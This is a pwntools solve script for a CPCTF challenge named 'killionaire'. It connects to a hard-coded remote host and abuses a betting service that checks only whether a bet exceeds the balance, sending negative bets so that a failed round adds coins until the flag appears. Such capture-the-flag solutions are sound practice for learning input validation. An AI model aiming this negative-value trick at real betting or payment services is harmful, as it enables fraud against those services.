#!/usr/bin/env python3
"""
CPCTF - killionaire exploit script.

The bug is purely logical:
- the service allows negative bets because it only rejects `bet > coins`
- if a round "fails", the code executes `coins -= bet`
- for a negative bet, that operation *adds* money instead of subtracting it

This script uses the stable strategy described in the writeup:
for every round, read the displayed balance `coins` and send

    bet = coins - 1000

If that round goes to the failure branch, the new balance becomes exactly 1000
and the program prints the flag immediately.

Because each round has a 50% chance to fail, a single 10-round session wins
with probability 1 - 2^-10 = 1023/1024.  If a rare all-success session occurs,
the script reconnects and tries again.
"""

from __future__ import annotations

import re
import time

from pwn import context, remote


HOST = "133.88.122.244"
PORT = 32457
TARGET_COINS = 1000
MAX_ROUNDS = 10
MAX_SESSIONS = 20
COINS_RE = re.compile(r"Coins: (-?\d+)")


def choose_bet(coins: int, target: int = TARGET_COINS) -> int:
    """
    Pick a bet that guarantees `coins == target` if this round hits failure.

    The challenge only rejects bets strictly greater than the current balance.
    `coins - target` is therefore always valid because:

        coins - target <= coins

    and on failure:

        new_coins = coins - bet
                  = coins - (coins - target)
                  = target
    """
    return coins - target


def extract_coins(prompt: bytes) -> int:
    """Parse the current balance from a server prompt."""
    text = prompt.decode("latin-1", errors="replace")
    match = COINS_RE.search(text)
    if not match:
        raise ValueError(f"Could not parse coin count from prompt:\n{text}")
    return int(match.group(1))


def play_one_session(host: str = HOST, port: int = PORT) -> str | None:
    """
    Play one remote session using the deterministic bet-selection strategy.

    Returns:
        The full server response if a flag was recovered in this session,
        otherwise None.
    """
    io = remote(host, port, timeout=5)

    try:
        for _round in range(MAX_ROUNDS):
            prompt = io.recvuntil(b"Bet: ")
            coins = extract_coins(prompt)
            bet = choose_bet(coins)
            io.sendline(str(bet).encode())

            response = io.recvrepeat(0.8)
            if b"Flag:" in response:
                return (prompt + response).decode("latin-1", errors="replace")

            if b"Game Over." in response or b"lost all your coins" in response:
                break
    finally:
        io.close()

    return None


def solve(max_sessions: int = MAX_SESSIONS) -> str:
    """
    Retry whole sessions until the flag is recovered or the retry budget ends.
    """
    last_error: Exception | None = None

    for session in range(1, max_sessions + 1):
        try:
            result = play_one_session()
            if result is not None:
                return result
        except Exception as exc:  # pragma: no cover - network errors are expected
            last_error = exc
            print(f"[session {session}] error: {exc}")

        # Small pause to avoid hammering the remote service on reconnect.
        time.sleep(0.4)

    if last_error is not None:
        raise RuntimeError(
            f"Failed to recover the flag after {max_sessions} sessions."
        ) from last_error
    raise RuntimeError(f"Failed to recover the flag after {max_sessions} sessions.")


def main() -> None:
    context.log_level = "error"
    print(solve().strip())


if __name__ == "__main__":
    main()
